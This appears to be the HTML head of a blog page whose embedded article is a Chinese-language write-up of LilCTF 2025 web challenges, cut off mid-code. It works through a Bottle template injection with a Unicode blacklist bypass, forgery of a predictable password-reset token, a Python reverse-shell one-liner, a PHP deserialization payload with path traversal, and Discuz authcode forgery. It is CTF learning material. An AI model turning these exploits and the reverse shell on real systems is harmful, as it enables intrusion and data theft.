<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>LilCTF 2025 WEB Writeup | w8nn9z Blog</title>
<meta name="keywords" content="">
<meta name="description" content="LilCTF 2025 WEB Writeup - w8nn9z Blog">
<meta name="author" content="">
<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/lilctf-2025-web-writeup/">

<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/lilctf-2025-web-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/lilctf-2025-web-writeup/">
  <meta property="og:site_name" content="w8nn9z Blog">
  <meta property="og:title" content="LilCTF 2025 WEB Writeup">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-17T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-08-28T00:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="LilCTF 2025 WEB Writeup">
<meta name="twitter:description" content="">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://z9nn8w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTF",
      "item": "https://z9nn8w.github.io/posts/ctf/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "LilCTF 2025 WEB Writeup",
      "item": "https://z9nn8w.github.io/posts/ctf/lilctf-2025-web-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LilCTF 2025 WEB Writeup",
  "name": "LilCTF 2025 WEB Writeup",
  "description": "",
  "keywords": [
    
  ],
  "articleBody": "ez_bottle é™„ä»¶ç»™äº†æºç ï¼Œweb-ez-bottle.pyï¼š\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads') os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), 'static') MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [\"{\", \"}\", \"os\", \"eval\", \"exec\", \"sock\", \"\u003c\", \"\u003e\", \"bul\", \"class\", \"?\", \":\", \"bash\", \"_\", \"globals\", \"get\", \"open\"] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr \u003e\u003e 16) \u0026 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route('/') def index(): return static_file('index.html', root=STATIC_DIR) @route('/static/') def server_static(filename): return static_file(filename, root=STATIC_DIR) @route('/upload') def upload_page(): return static_file('upload.html', root=STATIC_DIR) @post('/upload') def upload(): zip_file = request.files.get('file') if not zip_file or not zip_file.filename.endswith('.zip'): return 'Invalid file. Please upload a ZIP file.' if len(zip_file.file.read()) \u003e MAX_FILE_SIZE: return 'File size exceeds 1MB. Please upload a smaller ZIP file.' zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, 'upload.zip') zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, 'r') as z: for file_info in z.infolist(): if is_symlink(file_info): return 'Symbolic links are not allowed.' real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return 'Path traversal detected.' z.extractall(extract_dir) except zipfile.BadZipFile: return 'Invalid ZIP file.' files = os.listdir(extract_dir) files.remove('upload.zip') return template(\"æ–‡ä»¶åˆ—è¡¨: {{files}}\\nè®¿é—®: /view/{{md5}}/{{first_file}}\", files=\", \".join(files), md5=md5_hash, first_file=files[0] if files else \"nofile\") @route('/view//') def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \"File not found.\" with open(file_path, 'r', encoding='utf-8') as f: content = f.read() if contains_blacklist(content): return \"you are hacker!!!nonono!!!\" try: return template(content) except Exception as e: return f\"Error rendering template: {str(e)}\" @error(404) def error404(error): return \"bbbbbboooottle\" @error(403) def error403(error): return \"Forbidden: You don't have permission to access this resource.\" if __name__ == '__main__': run(host='0.0.0.0', port=5000, debug=False) pythonçš„bottleæ¡†æ¶ï¼Œå®ç°äº†ä¸Šä¼ zipå‹ç¼©åŒ…å¹¶è§£å‹åˆ°æŒ‡å®šç›®å½•çš„åŠŸèƒ½ï¼ŒåŒæ—¶æœ‰å¯¹å†…å®¹çš„è¿‡æ»¤ï¼Œå¯ä»¥å‘ç°è¿‡æ»¤äº†å¸¸ç”¨çš„æ³¨å…¥æ¨¡æ¿{{}} \u003c%%\u003eä»¥åŠå¸¸è§çš„osç­‰å…³é”®å­—ï¼Œbottleæ¡†æ¶è¿˜å¯ä»¥ä½¿ç”¨å•ä¸ªç™¾åˆ†å·æ¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œä½†æ˜¯ä¸ä¼šå°†å†…å®¹æ¸²æŸ“åˆ°ç½‘é¡µã€‚ç»“åˆ/staticè·¯ç”±å¯ä»¥è¯»å–staticç›®å½•ä¸‹é™æ€æ–‡ä»¶çš„ç‰¹æ€§ï¼Œè€ƒè™‘å°†/flagæ–‡ä»¶å¤åˆ¶åˆ°staticç›®å½•ä¸­ï¼ŒæœŸæœ›æ‰§è¡Œçš„å‘½ä»¤ï¼š\ncp /flag ./static/flag.txt ä¸€å¼€å§‹è€ƒè™‘é€šè¿‡æ–œä½“å­—ç¬¦æ¥ç»•è¿‡oå’Œaï¼Œå¤šæ¬¡å°è¯•ä¹‹åæ‰å‘ç°æ‰“å¼€æ–‡ä»¶çš„ç¼–ç æ–¹å¼æ˜¯utf-8ï¼Œæ–œä½“å­—ç¬¦ä¼šè¢«è§£ææˆç”Ÿåƒ»æ±‰å­—ï¼Œè€ƒè™‘å¾€UnicodeéASCIIå­—ç¬¦æ–¹å‘èµ°ï¼Œç¼–å†™æ¶æ„æ–‡ä»¶å†…å®¹è¦æ³¨æ„å¼€å¤´éœ€è¦æœ‰ä¸ªå›è½¦ç¬¦ï¼Œå¦åˆ™%åçš„å†…å®¹ä¸ä¼šè¢«å½“ä½œpythonå‘½ä»¤æ‰§è¡Œï¼š\n% from bottle import request\r% import ğ¨s\r% ğ¨s.system(request.query.v1) å®Œæ•´exp:\nfrom urllib.parse import unquote import requests import zipfile url = \"http://challenge.xinshi.fun:46226/upload\" file_path = \"./file.zip\" payload = unquote(\"%0A\") payload += \"% \" + \"from bottle import request\\n\" payload += \"% \" + \"import ğ¨s\\n\" payload += \"% \" + \"ğ¨s.system(request.query.v1)\" with open(\"file.txt\", \"wb\") as f: f.write(payload.encode('utf-8')) with zipfile.ZipFile(\"file.zip\", 'w', zipfile.ZIP_DEFLATED) as zip: zip.write(\"file.txt\") with open(file_path, 'rb') as f: files = {'file': (file_path, f, 'application/zip')} response = requests.post(url, files=files) print(response.text) # è¾“å‡ºæœåŠ¡å™¨è¿”å›çš„ç»“æœ å†å»è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¸¦ä¸Šv1ä¼ å‚è¦æ‰§è¡Œçš„å‘½ä»¤ï¼š\nhttp://challenge.xinshi.fun:46226/view/33fb755cb11889d8398700b6238f5375/file.txt?v1=cp%20/flag%20./static/flag.txt åšå®Œä¹‹åå‘ç°æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤flagå­—ç¬¦ï¼Œæ ¹æœ¬ç”¨ä¸ç€å¯¼å…¥bottleä¸­çš„requestï¼Œrequest.query.v1ç±»ä¼¼flaskä¸­çš„request.args.v1ï¼š\n% import ğ¨s\r% ğ¨s.system('cp /flag ./static/flag.txt') æœ€åè®¿é—®staticç›®å½•ä¸­çš„flag.txtå³å¯æ‹¿åˆ°flagï¼šLILCTF{6oT7IE_has_6eeN_recyc13d}\nå‚è€ƒèµ„æ–™ï¼š\nhttps://xz.aliyun.com/news/17718\nhttps://www.osgeo.cn/bottle/api.html#the-request-object\nEkko_note é¢˜ç›®ç»™äº†æºç ï¼Œweb-ekko_exec.pyï¼š\n# -*- encoding: utf-8 -*- ''' @File : app.py @Time : 2066/07/05 19:20:29 @Author : Ekko exec inc. æŸç‰›é©¬ç¨‹åºå‘˜ ''' import os import time import uuid import requests from functools import wraps from datetime import datetime from secrets import token_urlsafe from flask_sqlalchemy import SQLAlchemy from werkzeug.security import generate_password_hash, check_password_hash from flask import Flask, render_template, redirect, url_for, request, flash, session SERVER_START_TIME = time.time() # æ¬¸æˆ‘è‰¹è¿™ä¸¤è¡Œä»£ç æµ‹è¯•ç”¨çš„å¿˜è®°åˆ äº†ï¼Œæ¬¸ç®—äº†éƒ½å‘å¸ƒäº†ï¼Œæˆ‘ä»¬éƒ½åœ¨ç”¨åŠ›åœ°æ´»ç€ï¼Œè·Ÿæˆ‘çš„ä¸‹ç­è¯´å»å§ã€‚ # åæ­£æ•´ä¸ªç¨‹åºæ²¡æœ‰ä¸€ä¸ªåœ°æ–¹ç”¨åˆ°randomåº“ã€‚åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚ import random random.seed(SERVER_START_TIME) admin_super_strong_password = token_urlsafe() app = Flask(__name__) app.config['SECRET_KEY'] = 'your-secret-key-here' app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.db' app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False db = SQLAlchemy(app) class User(db.Model): id = db.Column(db.Integer, primary_key=True) username = db.Column(db.String(20), unique=True, nullable=False) email = db.Column(db.String(120), unique=True, nullable=False) password = db.Column(db.String(60), nullable=False) is_admin = db.Column(db.Boolean, default=False) time_api = db.Column(db.String(200), default='https://api.uuni.cn//api/time') class PasswordResetToken(db.Model): id = db.Column(db.Integer, primary_key=True) user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False) token = db.Column(db.String(36), unique=True, nullable=False) used = db.Column(db.Boolean, default=False) def padding(input_string): byte_string = input_string.encode('utf-8') if len(byte_string) \u003e 6: byte_string = byte_string[:6] padded_byte_string = byte_string.ljust(6, b'\\x00') padded_int = int.from_bytes(padded_byte_string, byteorder='big') return padded_int with app.app_context(): db.create_all() if not User.query.filter_by(username='admin').first(): admin = User( username='admin', email='admin@example.com', password=generate_password_hash(admin_super_strong_password), is_admin=True ) db.session.add(admin) db.session.commit() def login_required(f): @wraps(f) def decorated_function(*args, **kwargs): if 'user_id' not in session: flash('è¯·ç™»å½•', 'danger') return redirect(url_for('login')) return f(*args, **kwargs) return decorated_function def admin_required(f): @wraps(f) def decorated_function(*args, **kwargs): if 'user_id' not in session: flash('è¯·ç™»å½•', 'danger') return redirect(url_for('login')) user = User.query.get(session['user_id']) if not user.is_admin: flash('ä½ ä¸æ˜¯admin', 'danger') return redirect(url_for('home')) return f(*args, **kwargs) return decorated_function def check_time_api(): user = User.query.get(session['user_id']) try: response = requests.get(user.time_api) data = response.json() datetime_str = data.get('date') if datetime_str: print(datetime_str) current_time = datetime.fromisoformat(datetime_str) return current_time.year \u003e= 2066 except Exception as e: return None return None @app.route('/') def home(): return render_template('home.html') @app.route('/server_info') @login_required def server_info(): return { 'server_start_time': SERVER_START_TIME, 'current_time': time.time() } @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form.get('username') email = request.form.get('email') password = request.form.get('password') confirm_password = request.form.get('confirm_password') if password != confirm_password: flash('å¯†ç é”™è¯¯', 'danger') return redirect(url_for('register')) existing_user = User.query.filter_by(username=username).first() if existing_user: flash('å·²ç»å­˜åœ¨è¿™ä¸ªç”¨æˆ·äº†', 'danger') return redirect(url_for('register')) existing_email = User.query.filter_by(email=email).first() if existing_email: flash('è¿™ä¸ªé‚®ç®±å·²ç»è¢«æ³¨å†Œäº†', 'danger') return redirect(url_for('register')) hashed_password = generate_password_hash(password) new_user = User(username=username, email=email, password=hashed_password) db.session.add(new_user) db.session.commit() flash('æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•', 'success') return redirect(url_for('login')) return render_template('register.html') @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form.get('username') password = request.form.get('password') user = User.query.filter_by(username=username).first() if user and check_password_hash(user.password, password): session['user_id'] = user.id session['username'] = user.username session['is_admin'] = user.is_admin flash('ç™»é™†æˆåŠŸï¼Œæ¬¢è¿!', 'success') return redirect(url_for('dashboard')) else: flash('ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯!', 'danger') return redirect(url_for('login')) return render_template('login.html') @app.route('/logout') @login_required def logout(): session.clear() flash('æˆåŠŸç™»å‡º', 'info') return redirect(url_for('home')) @app.route('/dashboard') @login_required def dashboard(): return render_template('dashboard.html') @app.route('/forgot_password', methods=['GET', 'POST']) def forgot_password(): if request.method == 'POST': email = request.form.get('email') user = User.query.filter_by(email=email).first() if user: # é€‰å“ªä¸ªUUIDç‰ˆæœ¬å¥½å‘¢ï¼Œå¥½å¤´ç–¼ \u003e_\u003c # UUID v8å§ï¼Œçœ‹èµ·æ¥ç‰ˆæœ¬æ¯”è¾ƒæ–° token = str(uuid.uuid8(a=padding(user.username))) # å¯ä»¥è‡ªå®šä¹‰å‚æ•°å—åŸæ¥ï¼Œé‚£æŠŠusernameæ”¾è¿›å»å§ reset_token = PasswordResetToken(user_id=user.id, token=token) db.session.add(reset_token) db.session.commit() # TODOï¼šå†™ä¸€ä¸ªSMTPæœåŠ¡æŠŠtokenå‘å‡ºå» flash(f'å¯†ç æ¢å¤tokenå·²ç»å‘é€ï¼Œè¯·æ£€æŸ¥ä½ çš„é‚®ç®±', 'info') return redirect(url_for('reset_password')) else: flash('æ²¡æœ‰æ‰¾åˆ°è¯¥é‚®ç®±å¯¹åº”çš„æ³¨å†Œè´¦æˆ·', 'danger') return redirect(url_for('forgot_password')) return render_template('forgot_password.html') @app.route('/reset_password', methods=['GET', 'POST']) def reset_password(): if request.method == 'POST': token = request.form.get('token') new_password = request.form.get('new_password') confirm_password = request.form.get('confirm_password') if new_password != confirm_password: flash('å¯†ç ä¸åŒ¹é…', 'danger') return redirect(url_for('reset_password')) reset_token = PasswordResetToken.query.filter_by(token=token, used=False).first() if reset_token: user = User.query.get(reset_token.user_id) user.password = generate_password_hash(new_password) reset_token.used = True db.session.commit() flash('æˆåŠŸé‡ç½®å¯†ç ï¼è¯·é‡æ–°ç™»å½•', 'success') return redirect(url_for('login')) else: flash('æ— æ•ˆæˆ–è¿‡æœŸçš„token', 'danger') return redirect(url_for('reset_password')) return render_template('reset_password.html') @app.route('/execute_command', methods=['GET', 'POST']) @login_required def execute_command(): result = check_time_api() if result is None: flash(\"APIæ­»äº†å•¦ï¼Œéƒ½ä½ å®³çš„å•¦ã€‚\", \"danger\") return redirect(url_for('dashboard')) if not result: flash('2066å¹´æ‰å®Œå·¥å“ˆï¼Œä½ å¯ä»¥ç©¿è¶Šåˆ°2066å¹´çœ‹çœ‹', 'danger') return redirect(url_for('dashboard')) if request.method == 'POST': command = request.form.get('command') os.system(command) # ä»€ä¹ˆï¼Ÿä½ è¯´å®‰å…¨ï¼Ÿä¸æ˜¯ï¼Œéƒ½è¯´äº†è¿˜æ²¡å®Œå·¥å‚¬ä»€ä¹ˆã€‚ return redirect(url_for('execute_command')) return render_template('execute_command.html') @app.route('/admin/settings', methods=['GET', 'POST']) @admin_required def admin_settings(): user = User.query.get(session['user_id']) if request.method == 'POST': new_api = request.form.get('time_api') user.time_api = new_api db.session.commit() flash('æˆåŠŸæ›´æ–°APIï¼', 'success') return redirect(url_for('admin_settings')) return render_template('admin_settings.html', time_api=user.time_api) if __name__ == '__main__': app.run(debug=False, host=\"0.0.0.0\") å®ç°äº†åŸºæœ¬çš„æ³¨å†Œï¼Œç™»å½•ï¼Œå¿˜è®°å¯†ç ç­‰åŠŸèƒ½ï¼Œä¸»è¦æ¼æ´å‡ºåœ¨å¿˜è®°å¯†ç çš„éƒ¨åˆ†ï¼Œä½¿ç”¨äº†uuid.uuid8æ¥ç”Ÿæˆtokenï¼Œè€Œå…¶ä¸­è°ƒç”¨äº†randomç”Ÿæˆäº†ä¼ªéšæœºæ•°ï¼Œé¢˜ç›®è¿˜ç»™äº†/server_infoæ¥è·å–æ—¶é—´æˆ³SERVER_START_TIMEï¼Œadminç”¨æˆ·åã€é‚®ç®±ä»¥åŠpaddingç®—æ³•éƒ½åœ¨æºç ä¸­ï¼Œåªè¦æ¨¡æ‹Ÿç”Ÿæˆä¸€æ¬¡tokenå°±å¯ä»¥å®ç°ä¿®æ”¹adminçš„å¯†ç å®ç°è¶Šæƒï¼Œèµ·ä¸€ä¸ªpython3.14çš„ç¯å¢ƒå°±èƒ½è·å–åˆ°uuid.uuid8äº†ï¼š\nimport random import uuid from secrets import token_urlsafe def padding(input_string): byte_string = input_string.encode('utf-8') if len(byte_string) \u003e 6: byte_string = byte_string[:6] padded_byte_string = byte_string.ljust(6, b'\\x00') padded_int = int.from_bytes(padded_byte_string, byteorder='big') return padded_int SERVER_START_TIME = 1755253132.849335 random.seed(SERVER_START_TIME) admin_super_strong_password = token_urlsafe() a = padding(\"admin\") token = uuid.uuid8(a=a) print(token) ç™»é™†æˆåŠŸåè€ƒè™‘å¦‚ä½•ä¿®æ”¹time_apiæ¥è®©date\u003e=2066ï¼Œå¯ä»¥ä½¿ç”¨åœ¨çº¿çš„è‡ªå®šä¹‰apiç½‘ç«™è‡ªå®šä¹‰è¿”å›jsonæ•°æ®ï¼Œhttps://app.beeceptor.com/ ï¼š\n{\"date\":\"2066-01-01T00:00:00\"} /admin/settingsä¸­å¡«å…¥è‡ªå®šä¹‰çš„apiï¼šhttps://lilctf.free.beeceptor.com/api/date ï¼Œå†è®¿é—®/execute_commandå³å¯å®ç°RCEã€‚ä½†æ˜¯ç”±äºæ‰§è¡Œçš„æ˜¯os.system()ï¼Œç½‘é¡µæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œå°è¯•åå¼¹shellï¼Œä¸€å¼€å§‹ç”¨bashå’Œncåå¼¹éƒ½å¤±è´¥äº†è¿˜ä»¥ä¸ºä¸å‡ºç½‘ï¼Œæœ€åå°è¯•pythonåå¼¹shellæˆåŠŸï¼š\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"your_ip\",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' flagåœ¨æ ¹ç›®å½•ä¸‹ï¼šLILCTF{U_HAvE_1OUnD_TH3_rIgH7_tlMEIINE!}\nå‚è€ƒèµ„æ–™ï¼š\nhttps://xz.aliyun.com/news/8987\nYour Uns3r index.phpï¼š\n\u003c?php highlight_file(__FILE__); class User { public $username; public $value; public function exec() { $ser = unserialize(serialize(unserialize($this-\u003evalue))); if ($ser != $this-\u003evalue \u0026\u0026 $ser instanceof Access) { include($ser-\u003egetToken()); } } public function __destruct() { if ($this-\u003eusername == \"admin\") { $this-\u003eexec(); } } } class Access { protected $prefix; protected $suffix; public function getToken() { if (!is_string($this-\u003eprefix) || !is_string($this-\u003esuffix)) { throw new Exception(\"Go to HELL!\"); } $result = $this-\u003eprefix . 'lilctf' . $this-\u003esuffix; if (strpos($result, 'pearcmd') !== false) { throw new Exception(\"Can I have peachcmd?\"); } return $result; } } $ser = $_POST[\"user\"]; if (strpos($ser, 'admin') !== false \u0026\u0026 strpos($ser, 'Access\":') !== false) { exit (\"no way!!!!\"); } $user = unserialize($ser); throw new Exception(\"nonono!!!\"); ååºåˆ—åŒ–çš„ç›®çš„æ˜¯å®ç°includeçš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥åˆ©ç”¨ç›®å½•ç©¿è¶Šï¼Œè®¾ç½®å¥½prefixå’Œsuffixå³å¯ï¼š\nclass Access { protected $prefix = \"/\"; protected $suffix = \"../../../../../flag\"; } # include(\"/lilctf/../../../../../flag\"); ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ä¸€å®šä¼šå‡ºç°Accessï¼Œç¬¬ä¸€ä¸ªè¦ç»•è¿‡çš„å°±æ˜¯Userä¸­ä¸èƒ½è®¾ç½®usernameä¸ºadminï¼Œå¦åˆ™æ— æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯__destruct()åˆè¦æ±‚$this-\u003eusername == \"admin\"ä¸ºçœŸæ‰æ‰§è¡Œexec()ï¼Œå¯ä»¥åˆ©ç”¨trueçš„å¼±æ¯”è¾ƒç‰¹æ€§æ¥ç»•è¿‡ï¼š\nclass User { public $username = true; # trueä¸éç©ºå­—ç¬¦ä¸²è¿›è¡Œå¼±æ¯”è¾ƒè¿”å›true public $value; } $ser = unserialize(serialize(unserialize($this-\u003evalue)));å’Œä¸‹é¢çš„åˆ¤æ–­$ser != $this-\u003evalue \u0026\u0026 $ser instanceof Accessçœ‹ä¸Šå»æœ‰ç‚¹ç»•ï¼Œå®é™…ä¸ŠæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘ï¼Œ$this-\u003evalueæ˜¯åºåˆ—åŒ–åçš„serï¼Œå³serialize(new Access())ï¼Œç¬¦åˆæ‰€æœ‰æ¡ä»¶ï¼Œæ ¹æœ¬æ²¡æœ‰ä»€ä¹ˆéœ€è¦ç»•è¿‡çš„åœ°æ–¹\næ­¤æ—¶å·²ç»èƒ½å†™å‡ºå®Œæ•´çš„expï¼š\n\u003c?php class User { public $username = true; public $value; } class Access { protected $prefix = \"/\"; protected $suffix = \"../../../../../flag\"; } $a = new User(); $b = new Access(); $a-\u003evalue = serialize($b); print (urlencode(serialize($a))); ?\u003e æœ€åè¿˜æœ‰ä¸€ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹ï¼Œthrow new Exception(\"nonono!!!\");ä¼šåœ¨__destruct()è§¦å‘å‰å°±æŠ›å‡ºå¼‚å¸¸ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œææ„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•è¯»å–/flagï¼Œç›´æ¥å°†åºåˆ—åŒ–ç»“æœæœ€åçš„}åˆ å»å³å¯è§¦å‘fast_destructç»•è¿‡throwï¼š\nuser=O%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bb%3A1%3Bs%3A5%3A%22value%22%3Bs%3A84%3A%22O%3A6%3A%22Access%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00prefix%22%3Bs%3A1%3A%22%2F%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3Bs%3A19%3A%22..%2F..%2F..%2F..%2F..%2Fflag%22%3B%7D%22%3B LILCTF{90NNa_f1ND_y#UR_@NsW3r_7o_UNseR}\nå‚è€ƒèµ„æ–™ï¼š\nhttps://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\næˆ‘æ›¾æœ‰ä¸€ä»½å·¥ä½œ flag åœ¨ pre_a_flag è¡¨é‡Œ\nDiscuz! X3.5ï¼Œwww.zipæœ‰å¤‡ä»½æºç ï¼Œå…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹é…ç½®ç›®å½•configï¼Œæ ¹æ®ä¿®æ”¹æ—¶é—´æ’é™¤deafultä¸­åŒåçš„ä¿¡æ¯ï¼š\ndefine('UC_KEY', 'N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb');\t// ä¸ UCenter çš„é€šä¿¡å¯†é’¥, è¦ä¸ UCenter ä¿æŒä¸€è‡´ é€šè¿‡UC_KEYå¯ä»¥è®¡ç®—_authcodeï¼Œdbbak.phpï¼š\n$timestamp = time(); if($timestamp - $get['time'] \u003e 3600) { exit('Authorization has expired'); } ... if($get['method'] == 'export') { $db-\u003equery('SET SQL_QUOTE_SHOW_CREATE=0', 'SILENT'); $time = date(\"Y-m-d H:i:s\", $timestamp); $tables = array(); $tables = arraykeys2(fetchtablelist($tablepre), 'Name'); if($apptype == 'discuz') { $query = $db-\u003equery(\"SELECT datatables FROM {$tablepre}plugins WHERE datatables\u003c\u003e''\"); while($plugin = $db-\u003efetch_array($query)) { foreach(explode(',', $plugin['datatables']) as $table) { if($table = trim($table)) { $tables[] = $table; } } } } if($apptype == 'discuzx') { $query = $db-\u003equery(\"SELECT datatables FROM {$tablepre}common_plugin WHERE datatables\u003c\u003e''\"); while($plugin = $db-\u003efetch_array($query)) { foreach(explode(',', $plugin['datatables']) as $table) { if($table = trim($table)) { $tables[] = $table; } } } } ... function encode_arr($get) { $tmp = ''; foreach($get as $key =\u003e $val) { $tmp .= '\u0026'.$key.'='.$val; } return _authcode($tmp, 'ENCODE', UC_KEY); } ... function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u003c= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i \u003c 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i \u003c $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == 'DECODE') { if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() \u003e 0) \u0026\u0026 substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ''; } } else { return $keyc.str_replace('=', '', base64_encode($result)); } } $next_url = (is_https() ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?apptype='.$GLOBALS['apptype'].'\u0026code='.urlencode(encode_arr($get)); å¯ä»¥çœ‹åˆ°éœ€è¦ä¼ å…¥apptypeï¼Œè¿™é‡Œç”¨çš„æ˜¯discuzXï¼Œåº”è¯¥ä¼ å…¥å‚æ•°å€¼discuzxï¼Œè¿˜éœ€è¦ä¼ å…¥codeï¼Œå¯ä»¥å‘ç°$geté‡Œæ¯”è¾ƒé‡è¦çš„ä¸¤ä¸ªé”®å€¼å¯¹æ˜¯timeå’Œmethodï¼Œå¹¶ä¸”codeæœ‰1å°æ—¶çš„æœ‰æ•ˆæœŸï¼Œå…ˆå°è¯•ç”Ÿæˆä¸€ä¸ªï¼š\n\u003c?php function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : UC_KEY); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i \u003c= 255; $i++) { 